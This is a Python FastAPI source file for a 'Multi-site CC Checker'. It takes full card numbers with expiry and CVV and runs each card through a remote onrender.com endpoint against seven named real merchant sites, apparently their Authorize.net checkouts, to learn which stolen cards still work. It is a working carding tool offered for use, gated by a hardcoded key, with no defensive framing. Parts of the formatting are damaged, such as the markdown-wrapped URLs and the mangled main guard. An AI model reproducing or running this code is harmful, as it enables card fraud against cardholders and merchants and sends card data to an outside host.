from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import JSONResponse
import aiohttp
import asyncio
import time
import json
from typing import List, Dict, Any, Tuple

app = FastAPI(title="Multi-site CC Checker")

# ------------ Configuration ------------

ALLOWED_GATEWAY = "killer"
ALLOWED_KEY = "rockybest"

SITES: List[str] = [
"[https://deltacloudz.com](https://deltacloudz.com)",
"[https://therapyessentials.coraphysicaltherapy.com](https://therapyessentials.coraphysicaltherapy.com)",
"[https://restart.brooksrunning.com](https://restart.brooksrunning.com)",
"[https://lptmedical.com](https://lptmedical.com)",
"[https://livelovespa.com](https://livelovespa.com)",
"[https://safeandsoundhq.com](https://safeandsoundhq.com)",
"[https://urbanspaceinteriors.com](https://urbanspaceinteriors.com)"
]

REMOTE_API_TEMPLATE = "[https://rockyysoon-fb0f.onrender.com/index.php?site={site}&cc={cc}](https://rockyysoon-fb0f.onrender.com/index.php?site={site}&cc={cc})"

MAX_CONCURRENT = 3          # max number of concurrent requests
REQUEST_TIMEOUT = 40        # seconds per request
CONNECT_TIMEOUT = 25        # seconds for connection

# ---------------------------------------

def parse_cc(cc_raw: str) -> Tuple[str, str, str, str]:
"""
Expecting CC in format: PAN|MM|YY|CVV
Strips whitespace and validates presence of 4 parts.
"""
parts = [p.strip() for p in cc_raw.split("|")]
if len(parts) != 4 or not all(parts):
raise ValueError("Invalid CC format. Expecting PAN|MM|YY|CVV")
return parts[0], parts[1], parts[2], parts[3]

async def fetch_site(session: aiohttp.ClientSession, site: str, cc_for_site: str, sem: asyncio.Semaphore) -> Dict[str, Any]:
url = REMOTE_API_TEMPLATE.format(site=site, cc=cc_for_site)
async with sem:
start = time.perf_counter()
try:
timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
async with session.get(url, timeout=timeout) as resp:
raw_text = await resp.text()
try:
parsed = json.loads(raw_text)
except Exception:
parsed = {"raw": raw_text.strip()}
elapsed = time.perf_counter() - start
return {
"gateway": "Authorize.net",
"api": url,
"site": site,
"cc": cc_for_site,
"elapsed_ms": int(elapsed * 1000),
"response": parsed
}
except Exception as e:
elapsed = time.perf_counter() - start
return {
"gateway": "Authorize.net",
"api": url,
"site": site,
"cc": cc_for_site,
"elapsed_ms": int(elapsed * 1000),
"response": {"error": str(e)}
}

@app.get("/gateway")
async def gateway(request: Request):
params = request.query_params
gateway = params.get("gateway")
key = params.get("key")
cc_raw = params.get("cc")

```
if not gateway or not key or not cc_raw:
    raise HTTPException(status_code=400, detail="Missing parameters: gateway, key, cc")
if gateway != ALLOWED_GATEWAY or key != ALLOWED_KEY:
    raise HTTPException(status_code=403, detail="Unauthorized gateway/key")

try:
    # Validate format but DO NOT modify the CVV — use the card exactly as provided.
    pan, mm, yy, cvv = parse_cc(cc_raw)
except ValueError as e:
    raise HTTPException(status_code=400, detail=str(e))

# Prepare CC for every configured site — use the original cc as given (no CVV overrides).
cc_per_site = [(site, cc_raw) for site in SITES]

# limit concurrency sensibly (cannot exceed number of sites)
sem = asyncio.Semaphore(min(MAX_CONCURRENT, max(1, len(SITES))))
start_time = time.perf_counter()

connector = aiohttp.TCPConnector(limit_per_host=min(MAX_CONCURRENT, len(SITES)))
headers = {"User-Agent": "MultiSiteCCChecker/1.0", "Accept": "application/json"}

async with aiohttp.ClientSession(connector=connector, headers=headers) as session:
    tasks = [fetch_site(session, site, cc, sem) for site, cc in cc_per_site]
    results = await asyncio.gather(*tasks)

total_time_sec = int(time.perf_counter() - start_time)
minutes = total_time_sec // 60
seconds = total_time_sec % 60
total_time_formatted = f"{minutes}m:{seconds}s"

final_response = {
    "total_time": total_time_formatted,
    "results": results
}

return JSONResponse(content=final_response)
```

if **name** == "**main**":
import uvicorn
uvicorn.run("app:app", host="0.0.0.0", port=8000, reload=False)
